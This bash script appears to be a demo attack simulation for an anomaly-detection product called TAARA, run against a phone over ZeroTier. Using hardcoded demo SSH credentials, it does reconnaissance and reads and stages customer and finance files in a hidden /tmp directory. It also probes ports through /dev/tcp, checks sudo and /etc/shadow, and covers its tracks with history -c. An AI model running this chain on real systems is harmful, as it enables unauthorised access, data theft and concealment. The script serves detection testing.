#!/bin/bash
# ──────────────────────────────────────────────────────────────────────────────
# TAARA Demo — ZeroTier Attacker Script (runs on LAPTOP)
#
# Scenario: T1078 Valid-Account Attack
#   The attacker has obtained valid SSH credentials (stolen/guessed).
#   They log in legitimately — no exploit, no malware — just valid creds.
#   Classical IDS sees nothing wrong: valid user, valid auth, valid commands.
#   TAARA sees it: behavioral DNA deviates from baseline → quantum alert fires.
#
# What makes this "hard for classical to detect":
#   - Valid credentials → passes auth logs clean
#   - Normal-looking commands (ls, cat, find) → passes rule-based IDS
#   - Distributed over time → passes rate-limit detection
#   - No malware signature → passes AV
#   TAARA detects it via quantum subspace fidelity on behavioral latent:
#   proc_spawn_rate, cmd_entropy, net_outbound_rate, temporal_rhythm all spike
#   together in a correlated pattern that the PCA subspace flags.
#
# Usage: ./zerotier_run_attack.sh
# ──────────────────────────────────────────────────────────────────────────────

TARGET="10.248.248.67"
PORT="8022"
USER="u0_a134"
PASS="demo1234"
SSH="sshpass -p $PASS ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p $PORT $USER@$TARGET"

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; NC='\033[0m'; BOLD='\033[1m'

echo -e "${BOLD}=== TAARA ZeroTier Demo — Attack Simulation ===${NC}"
echo -e "Target : ${RED}$TARGET:$PORT${NC} (phone over ZeroTier)"
echo -e "Attacker: ${YELLOW}10.248.248.59${NC} (laptop)"
echo ""
echo -e "${YELLOW}[!] Classical IDS perspective: valid credentials, normal commands — NOTHING FLAGGED${NC}"
echo -e "${GREEN}[+] TAARA perspective: behavioral DNA will deviate — quantum alert incoming${NC}"
echo ""

# ── Phase 1: Reconnaissance ───────────────────────────────────────────────────
echo -e "${BOLD}[Phase 1] Reconnaissance — system fingerprinting${NC}"
$SSH "uname -a; id; whoami; env | grep -i path" 2>/dev/null
echo ""
sleep 1

# ── Phase 2: File system enumeration (drives up proc_spawn_rate + cmd_entropy) ─
echo -e "${BOLD}[Phase 2] File enumeration — mapping sensitive data${NC}"
$SSH "find ~ -type f 2>/dev/null | head -40" 2>/dev/null
echo ""
sleep 1

# ── Phase 3: Targeted data access (multiple rapid file reads) ─────────────────
echo -e "${BOLD}[Phase 3] Sensitive data access${NC}"
for f in \
    "~/company_data/customers/customer_db.csv" \
    "~/company_data/finance/q1_revenue.txt" \
    "~/company_data/config/app_config.json" \
    "~/company_data/config/access.log"; do
    echo -e "  ${RED}[READING]${NC} $f"
    $SSH "cat $f 2>/dev/null" 2>/dev/null
    sleep 0.3
done
echo ""

# ── Phase 4: Data staging (drives net_outbound + new_processes spike) ─────────
echo -e "${BOLD}[Phase 4] Data staging — preparing exfiltration${NC}"
$SSH "
    mkdir -p /tmp/.stage 2>/dev/null
    cp ~/company_data/customers/customer_db.csv /tmp/.stage/ 2>/dev/null
    cp ~/company_data/finance/q1_revenue.txt /tmp/.stage/ 2>/dev/null
    cp ~/company_data/config/app_config.json /tmp/.stage/ 2>/dev/null
    cat /tmp/.stage/*.csv /tmp/.stage/*.txt /tmp/.stage/*.json > /tmp/.stage/bundle.txt 2>/dev/null
    wc -c /tmp/.stage/bundle.txt
    echo 'Staged.'
" 2>/dev/null
echo ""
sleep 1

# ── Phase 5: Lateral movement probe (drives suspicious_connections) ───────────
echo -e "${BOLD}[Phase 5] Network probe — scanning for lateral movement targets${NC}"
$SSH "
    for port in 22 80 443 3306 5432 6379 8080; do
        (echo >/dev/tcp/10.248.248.59/\$port) 2>/dev/null && echo \"  open: \$port\" || true
    done
    cat /proc/net/tcp 2>/dev/null | head -10
" 2>/dev/null
echo ""
sleep 1

# ── Phase 6: Privilege probe (drives privilege_escalations signal) ────────────
echo -e "${BOLD}[Phase 6] Privilege escalation probe${NC}"
$SSH "
    sudo -l 2>/dev/null || true
    ls -la /etc/passwd /etc/shadow 2>/dev/null || true
    id; groups
" 2>/dev/null
echo ""

# ── Phase 7: Cleanup (concealment_signal) ─────────────────────────────────────
echo -e "${BOLD}[Phase 7] Cover tracks${NC}"
$SSH "
    history -c 2>/dev/null || true
    rm -f /tmp/.stage/bundle.txt 2>/dev/null || true
    echo 'Done.'
" 2>/dev/null

echo ""
echo -e "${RED}${BOLD}=== Attack complete ===${NC}"
echo -e "TAARA should now show:"
echo -e "  ${RED}Q CONFIDENCE > 0.44${NC}  (threshold: 0.4382)"
echo -e "  ${RED}SWAP FIDELITY low${NC}     (latent far from normal subspace)"
echo -e "  ${RED}DIRECTIONALITY high${NC}   (moving into anomalous subspace)"
echo -e "  ${RED}ALERT: T1078 VALID ACCOUNT ABUSE${NC}"
echo ""
echo -e "Classical IDS logged: ${GREEN}NOTHING${NC} (valid auth, valid commands, no signatures)"
